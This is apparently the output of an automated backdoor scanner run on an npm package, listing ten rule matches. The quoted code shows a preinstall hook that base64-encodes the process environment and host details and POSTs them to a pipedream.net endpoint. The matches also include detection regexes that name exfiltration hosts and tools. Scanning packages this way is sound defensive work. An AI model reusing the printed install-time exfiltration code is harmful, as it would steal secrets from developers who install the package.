[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000702[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Environment[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/index.js[0m
   Pattern: [32m(env|environment).{1,50}(get|post|curl|nc|invoke-restmethod)[0m
[30;1m17 | [0m[35m// console.log(currentEnvBase64)[0m
[30;1m18 | [0m[35m[0m
[30;1m19 | [0m[35mvar data = {[0m
[30;1m20 | [0m[35m        envPORT: process.env.PORT,[0m
[30;1m21 | [0m[35m        hostname: JSON.stringify(os.hostname()),[0m
[30;1m22 | [0m[35m        currentPath: currentPath,[0m
[30;1m23 | [0m[35m        currentFile: currentFile,[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000702[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Environment[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/index.js[0m
   Pattern: [32m(env|environment).{1,50}(get|post|curl|nc|invoke-restmethod)[0m
[30;1m8 | [0m[35m// var currentUser =[0m
[30;1m9 | [0m[35mvar currentPath = __dirname;[0m
[30;1m10 | [0m[35mvar currentFile = __filename;[0m
[30;1m11 | [0m[35m// var currentEnv = process.env;[0m
[30;1m12 | [0m[35mvar currentEnvString = JSON.stringify(process);[0m
[30;1m13 | [0m[35mvar currentEnvBase64 = Buffer.from(currentEnvString).toString('base64');[0m
[30;1m14 | [0m[35m[0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000800[0m
       Tag: [34mSecurity.Backdoor.Obfuscation[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/index.js[0m
   Pattern: [32mbase64|encodedcommand|obfuscate[0m
[30;1m10 | [0m[35mvar currentFile = __filename;[0m
[30;1m11 | [0m[35m// var currentEnv = process.env;[0m
[30;1m12 | [0m[35mvar currentEnvString = JSON.stringify(process);[0m
[30;1m13 | [0m[35mvar currentEnvBase64 = Buffer.from(currentEnvString).toString('base64');[0m
[30;1m14 | [0m[35m[0m
[30;1m15 | [0m[35m// console.log(currentPath);[0m
[30;1m16 | [0m[35m// console.log(currentFile);[0m

[31m--[ [0m[34mMatch #[0m[33m4[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD001002[0m
       Tag: [34mSecurity.DependencyConfusion.AttackPattern.SuspiciousHostname[0m
  Severity: [36mCritical[0m, Confidence: [36mHigh[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.{1,45}(pipedream\.net|ceye\.io|burpcollaborator\.net|interact\.sh|requestbin\.net|nmnfbb\.com)[0m
[30;1m55 | [0m[35m// console.log(data.length)[0m
[30;1m56 | [0m[35m[0m
[30;1m57 | [0m[35mconst options = {[0m
[30;1m58 | [0m[35m  hostname: 'fb40d252f3831c4553eb428e5620a2a0.m.pipedream.net',[0m
[30;1m59 | [0m[35m  port: 443,[0m
[30;1m60 | [0m[35m  path: '/',[0m
[30;1m61 | [0m[35m  method: 'POST',[0m

[31m--[ [0m[34mMatch #[0m[33m5[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main": "index.js",[0m
[30;1m6 | [0m[35m  "scripts": {[0m
[30;1m7 | [0m[35m    "test": "echo \"Error: no test specified\" && exit 1",[0m
[30;1m8 | [0m[35m    "preinstall": "node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author": "",[0m
[30;1m11 | [0m[35m  "license": "ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m6[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000708[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.OSType[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32mos.type[0m
[30;1m22 | [0m[35m        currentPath: currentPath,[0m
[30;1m23 | [0m[35m        currentFile: currentFile,[0m
[30;1m24 | [0m[35m        currentEnvBase64: currentEnvBase64,[0m
[30;1m25 | [0m[35m        type: JSON.stringify(os.type()),[0m
[30;1m26 | [0m[35m        platform: JSON.stringify(os.platform()),[0m
[30;1m27 | [0m[35m        arch: JSON.stringify(os.arch()),[0m
[30;1m28 | [0m[35m        release: JSON.stringify(os.release()),[0m

[31m--[ [0m[34mMatch #[0m[33m7[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m55 | [0m[35m// console.log(data.length)[0m
[30;1m56 | [0m[35m[0m
[30;1m57 | [0m[35mconst options = {[0m
[30;1m58 | [0m[35m  hostname: 'fb40d252f3831c4553eb428e5620a2a0.m.pipedream.net',[0m
[30;1m59 | [0m[35m  port: 443,[0m
[30;1m60 | [0m[35m  path: '/',[0m
[30;1m61 | [0m[35m  method: 'POST',[0m

[31m--[ [0m[34mMatch #[0m[33m8[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m18 | [0m[35m[0m
[30;1m19 | [0m[35mvar data = {[0m
[30;1m20 | [0m[35m        envPORT: process.env.PORT,[0m
[30;1m21 | [0m[35m        hostname: JSON.stringify(os.hostname()),[0m
[30;1m22 | [0m[35m        currentPath: currentPath,[0m
[30;1m23 | [0m[35m        currentFile: currentFile,[0m
[30;1m24 | [0m[35m        currentEnvBase64: currentEnvBase64,[0m

[31m--[ [0m[34mMatch #[0m[33m9[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m18 | [0m[35m[0m
[30;1m19 | [0m[35mvar data = {[0m
[30;1m20 | [0m[35m        envPORT: process.env.PORT,[0m
[30;1m21 | [0m[35m        hostname: JSON.stringify(os.hostname()),[0m
[30;1m22 | [0m[35m        currentPath: currentPath,[0m
[30;1m23 | [0m[35m        currentFile: currentFile,[0m
[30;1m24 | [0m[35m        currentEnvBase64: currentEnvBase64,[0m

[31m--[ [0m[34mMatch #[0m[33m10[0m[34m of [0m[33m10[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m65 | [0m[35m  }[0m
[30;1m66 | [0m[35m}[0m
[30;1m67 | [0m[35m[0m
[30;1m68 | [0m[35mconst req = https.request(options, res => {[0m
[30;1m69 | [0m[35m  // console.log(`statusCode: ${res.statusCode}`)[0m
[30;1m70 | [0m[35m[0m
[30;1m71 | [0m[35m  res.on('data', d => {[0m

10 matches found.
